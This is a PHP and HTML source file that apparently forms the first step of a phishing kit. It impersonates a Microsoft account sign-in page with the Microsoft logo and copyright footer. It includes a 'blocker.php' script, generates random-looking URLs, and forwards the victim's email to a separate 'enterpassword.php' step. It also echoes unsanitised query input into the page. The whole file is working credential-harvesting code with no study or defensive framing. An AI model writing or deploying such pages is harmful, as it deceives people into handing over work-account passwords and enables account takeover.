<?php
require "includes/functions.php";
require "includes/One_Time.php";
require "includes/enc.php";
error_reporting(0);

	include('blocker.php');
	// start > to get url and and put id 
	$url="http://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
	parse_str(parse_url($url, PHP_URL_QUERY));

	$parts = @explode('@', $email);
	$user = @$parts[0];
	// < end 
    $email = $_GET['email'];
	$error = $_GET['error'];
        
    function random_number(){
		$numbers = array(0,1,2,3,4,5,6,7,8,9,'A','b','C','D','e','F','G','H','i','J','K','L');
		$key = array_rand($numbers);
		return $numbers[$key]; 
	}

	$url = random_number().random_number().random_number().random_number().random_number().random_number().date('U').md5(date('U')).md5(date('U')).md5(date('U')).md5(date('U')).md5(date('U'));
	
	$post = 'enterpassword.php?'.$url;
	
	if (isset($_GET['email']) && !empty($_GET['email'])) {
		$email = $_GET['email'];	
		if($email) {
			header("Location: enterpassword.php?$url&email=$email&error=$error");
		}
	}

	$errorMsg = '';

	if(isset($_GET['error'])) {
		if ($_GET['error'] == 1) {	
			$errorMsg = "Enter a valid email.";
		} else if ($_GET['error'] == 2) {
			$errorMsg = "Make sure that you type the password for your work account.";
		}
	}
?>

<!DOCTYPE html>
<html>
<head>
	<title>Sign in to your account</title>
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no">

	<link rel="shortcut icon" type="icon" href="images/favicon.png">
	<link rel="stylesheet" type="text/css" href="style.css">
	<script type="text/javascript" src="js/jquery.js"></script>	
	
	<script type="text/javascript">
		function isValidEmailAddress(emailAddress) {
		    var pattern = new RegExp(/^(("[\w-\s]+")|([\w-]+(?:\.[\w-]+)*)|("[\w-\s]+")([\w-]+(?:\.[\w-]+)*))(@((?:[\w-]+\.)*\w[\w-]{0,66})\.([a-z]{2,6}(?:\.[a-z]{2})?)$)|(@\[?((25[0-5]\.|2[0-4][0-9]\.|1[0-9]{2}\.|[0-9]{1,2}\.))((25[0-5]|2[0-4][0-9]|1[0-9]{2}|[0-9]{1,2})\.){2}(25[0-5]|2[0-4][0-9]|1[0-9]{2}|[0-9]{1,2})\]?$)/i);
		    return pattern.test(emailAddress);
		};

		$(function(){

			$(document).ready(function(){
			    $("#next").click(function(){
			    	$('#loader').show();
		    		
		    		if(!isValidEmailAddress($('#email').val())) {
					    $('#email').addClass("error");
			    		$('#message').show();
			    		$('#message').text('Enter a valid email.');
			    		$('#loader').hide();

			    		$('#email').on('input',function(){
					    	$('#email').removeClass('error');
					    	$('#message').hide();
					    });
					    return false;
					}

			    });
			});
		});
	</script>
	
</head>

<body style="background-image:url(images/1.jpg)"
	<div class="overlay">
		<div class="login-box" style="width:500px;padding:40px;">
			<img src="images/ms-logo-v2.jpg" alt="logo">

			<h2 id="title"><b>Sign in</b></h2>

			<p id="message" class="message"><?php echo $errorMsg; ?></p>

			<form action="<?php echo $post; ?>" method="post">
				<input id="email" type="email" name="email" value="<?php echo $email; ?>" placeholder="Email, Phone or Skype" style="border:1px #0067b8;border-style: hidden hidden solid hidden;padding:0px;width:340px">
				<div id="loader" class="loader" hidden>
					<div class="circle"></div>
					<div class="circle"></div>
					<div class="circle"></div>
					<div class="circle"></div>
					<div class="circle"></div>
				</div>
				

			<div id="group1">
				<small id="create">No account? <a href="#" class="fade">Create one!</a></small>
			
			</div><br /><br /><br />
			<p align="right"><button id="next" class="next" style="width:100px;">Next</button></p>
			</form>
		</div>
	</div>

	<footer>
		<ul>
		    <li>...</li>
			<li><a href="#">Privacy & cookies</a></li>
			<li><a href="#">Terms of use</a></li>
			<li><a>&copy;2018 Microsoft</a></li>
		</ul>
	</footer>

</body>
</html>
